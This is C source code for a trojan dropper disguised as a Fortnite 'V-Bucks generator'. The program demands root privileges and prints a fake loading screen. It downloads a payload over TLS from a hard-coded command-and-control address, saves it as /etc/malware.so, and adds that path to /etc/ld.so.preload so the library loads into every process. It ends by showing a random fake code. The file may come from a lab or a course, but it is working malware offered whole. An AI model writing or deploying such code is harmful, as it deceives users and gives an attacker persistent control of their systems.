#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>


// CONFIGURATION
// ---------------------

#define C2_ADDR "172.21.0.12"
#define C2_PORT 6000
#define DOWNLOAD_COMMAND "download"
#define CHUNK_SIZE 1024


// FAKE UI GENERATOR
// ---------------------

// Display fake V-Bucks code
void printVBucksCode() {
    const char chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    char code[20];
    int i = 0, group = 0;

    srand(time(NULL));

    while (i < 19) {
        if (group == 4) {
            code[i++] = '-';
            group = 0;
        } else {
            code[i++] = chars[rand() % (sizeof(chars) - 1)];
            group++;
        }
    }
    code[i] = '\0';

    printf("=====================================\n");
    printf("  Generated Code: %s\n", code);
    printf("=====================================\n");
}

// Display fake loading screen
void printVBucksGenerator() {
    printf("\n");
    printf("=====================================\n");
    printf("||                                 ||\n");
    printf("||      V-BUCKS GENERATOR          ||\n");
    printf("||                                 ||\n");
    printf("=====================================\n");
    printf("||                                 ||\n");
    printf("||                                 ||\n");
    printf("||     Enjoy your V-Bucks!         ||\n");
    printf("||                                 ||\n");
    printf("||     Code is generating ...      ||\n");
    printf("||                                 ||\n");
    printf("=====================================\n\n");
}


// MALWARE RETRIEVAL
// ---------------------

// Download payload from C2 server over SSL
int getMalwareFromC2() {
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());

    if (ctx) {
        SSL *retrieve = SSL_new(ctx);
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock >= 0) {
            struct sockaddr_in addr;
            addr.sin_port = htons(C2_PORT);
            addr.sin_family = AF_INET;
            inet_pton(AF_INET, C2_ADDR, &addr.sin_addr);

            if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) == 0) {
                SSL_set_fd(retrieve, sock);
                if (SSL_connect(retrieve) == 1) {
                    SSL_write(retrieve, DOWNLOAD_COMMAND, sizeof(DOWNLOAD_COMMAND));
                    sleep(1);
                }

                FILE *file = fopen("/etc/malware.so", "wb");
                if (!file) {
                    return 0;
                }

                char buffer[CHUNK_SIZE];
                int bytesReceived;

                while ((bytesReceived = SSL_read(retrieve, buffer, CHUNK_SIZE)) > 0) {
                    if (fwrite(buffer, 1, bytesReceived, file) != (size_t)bytesReceived) {
                        fclose(file);
                        return 0;
                    }
                }

                if (bytesReceived < 0) {
                    return 0;
                }

                SSL_shutdown(retrieve);
                fclose(file);
            }

            close(sock);
        }

        SSL_free(retrieve);
        SSL_CTX_free(ctx);
    }

    return 1;
}


// MALWARE DEPLOYMENT
// ---------------------

// Write preload path to /etc/ld.so.preload
void writeLD_SO_PRELOAD() {
    printVBucksGenerator();

    FILE *file = fopen("/etc/ld.so.preload", "w");
    if (!file) {
        printf("Please execute this program using sudo or with correct privilege!\n");
        exit(-1);
    }

    fprintf(file, "/etc/malware.so");
    fclose(file);
}


// MAIN FUNCTION
// ---------------------

int main() {
    printf("WELCOME TO VBUCKS GENERATOR\n");

    if (geteuid() != 0) {
        printf("Please run this program using sudo or with correct privilege\n");
        exit(-1);
    }

    if (getMalwareFromC2() == 0) {
        printf("It seems our V-Bucks generator is down,\ntry again later to get the best battlepass!\n");
        exit(-1);
    }

    writeLD_SO_PRELOAD();
    printVBucksCode();

    return 0;
}
